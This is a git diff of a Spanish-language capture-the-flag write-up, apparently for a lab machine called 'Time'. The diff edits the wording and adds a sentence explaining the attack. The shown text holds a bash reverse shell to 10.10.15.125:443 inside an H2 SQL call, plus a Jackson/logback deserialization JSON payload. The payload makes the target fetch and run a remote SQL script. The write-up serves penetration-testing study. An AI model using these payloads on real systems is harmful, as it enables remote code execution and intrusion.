@@ -85,11 +85,12 @@ $$;
 CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.15.125/443 0>&1')
 ```
 
-Una vez creado el archivo me puse en el puerto **443** y levanté un servidor HTTP en el puerto 8000, una vez hecho esto envié la siguiente consulta a través de la aplicación web:
+Una vez creado el archivo me puse en escucha por el puerto **443** y levanté un servidor HTTP en el puerto 8000 una vez hecho esto envié la siguiente consulta a través de la aplicación web:
 
 ```json
 ["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.15.125:8000/inject.sql'"}]
 ```
+La consulta anterior lo que hace es decirle al aplicativo que ejecute el script de la url **http://10.10.15.125:8000/inject.sql** la cual es mi servicio http que levante en mi maquina y el cual tiene el script en sql el cual ejecuta una revershell a mi maquina por el puerto 443.
 
 <p align="center">
 <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/time/intrusion%20/payload.png">
